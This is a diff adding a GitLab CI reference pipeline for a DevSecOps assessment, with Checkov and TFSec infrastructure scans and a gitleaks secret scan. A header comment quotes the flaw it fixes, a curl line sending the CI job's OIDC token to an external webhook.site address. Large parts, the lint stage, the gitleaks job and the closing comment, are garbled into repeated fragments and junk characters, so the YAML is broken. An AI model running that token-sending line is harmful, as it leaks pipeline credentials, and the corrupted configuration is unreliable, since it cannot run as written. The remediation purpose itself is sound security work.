@@ -1,0 +1,68 @@
+# GitLab CI – Secure DevSecOps Pipeline (Reference)
+#
+# NOTE: The actual running pipeline for this assessment is GitHub Actions:
+#   rajutest-devops/terragoat → .github/workflows/devsecops-pipeline.yml
+#
+# This file is the GitLab CI equivalent, required by the assessment document.
+# Same three stages, same tools — GitLab syntax instead of GitHub Actions syntax.
+#
+# Key fix vs the original gitlabci/bla.yml (FIND-003 / SC-001):
+#   Original: curl "$CI_JOB_JWT_V1" https://webhook.site/...  ← sends OIDC token externally
+#   Fixed:    Token is never sent anywhere. Cloud auth uses OIDC within the runner only.
+
+stages:
+  - lint
+  - iac-scan
+  - secret-scan
+
+variables:
+  TF_VERSION: "1.5.7"
+  CHECKOV_VERSION: "3.2.0"
+
+# ── Stage 1: Lint ─────────────────────────────────────────────�# ── Stage 1: Lint ─────────────────────────────────────� s# ── Stage 1: Lint ─────────ON}   # ── Stage 1: Lint ────────────────�si# ── Stage 1: Lint ────────────────�locke# ── Stage 1: Lint ─────────────────SION# ── Stage 1: Lint ───────────────────rm val# ── Stage 1: Lint ─────────────d=# ── Stage 1: Lint ─────────────────────�lse &&# ── Stage 1: Lint ───────────────────e
+
+# ── Stage # ─�Sc# ─�──�# ── ��──# ─�─�# ── Stage # ─��──────────────────────────────────────
+# Checkov and TFSec run in parallel. Results go to GitLab Security Dashboard.
+
+checkov-scan:
+  stage: iac-scan
+  image: bridgecrew/checkov:${CHECKOV_VERSION}
+  script:
+    - checkov -d terraform/aws   --output json --output-file checkov-aws.json   || true
+    - checkov -d terraform/azure --output json --output-file checkov-azure.json || true
+    - checkov -d terraform/gcp   --output json --output-file checkov-gcp.json   || true
+    - checkov -d terraform/ --output cli
+  artifacts:
+    reports:
+      sast: [checkov-aws.json, checkov-azure.json, checkov-gcp.json]
+    paths: [checkov-*.json]
+    expire_in: 30 days
+  allow_failure: true   # findings visible in Security Dashboard but don't block merge
+
+tfsec-scan:
+  stage: iac-scan
+  image: aquasec/tfsec:v1.28.4
+  script:
+    - tfsec terraform/aws   --format json > tfsec-aws.json   || true
+    - tfsec terraform/azure --format json > tfsec-azure.json || true
+    - tfsec terraform/gcp   --format json > tfsec-gcp.json   || true
+    - tfsec terraform/ --format default
+  artifacts:
+    paths: [tfsec-*.json]
+    expire_in: 30 days
+  allow_failure: true
+
+# ── Stage 3: Secret # ── Stage 3: Secret # ── Stage��──#��──�# ── Stage 3: Secret # ── Stage 3: Secret # ── Stage��──#��──�# ��# ── Stage 3: Secret # ── Stage 3: Secret # ── Stage��──#��──�# �de# ── Stage 3: Secret # ── Stage 3: Secret # ── Stage��──#��──se).
+
+gggggggggggggggggggggggggggggggggggggggmagggggggggghezagggggggggs:v8gggggggggggggggggggggggggggggggggggggggmagggggggggghezaggggggt --sourgggggggggggggggggggggjson --ggggggggggggggggeaks-cugggggggggggggggggggggggggggggggggggggggmagggggggggghezagggggggggs:v8gggggggggggggggggtheggggggged
+    - gitleaks detec    - gitleaks detec    - -all" --report-    - gitleaks detec    - gitleaks detec    - -all" --report-    - "$    - gitleaks detec    - gitleaks detec    - -all" --report-    - json"; exit 1; fi
+  artifacts:
+    paths: [gitleaks-current.json, gitle    paths: [gitleaks-current.json,  days
+    when: al    when: al    whre: fals    when: al    when:ck    when: al    ot just warn
+
+# ── What this pipeline does NOT do (intentional) ───────────────────────────────
+# No terraform plan or apply — pipeline scans only.
+# No cloud credentials stored — zero credential exposure risk.
+# If deployment is needed, use OIDC (id_tokens) not hardcoded keys:
+#
+#############################################################################################################################################################################################################################################################################################r sent to an external endpoint
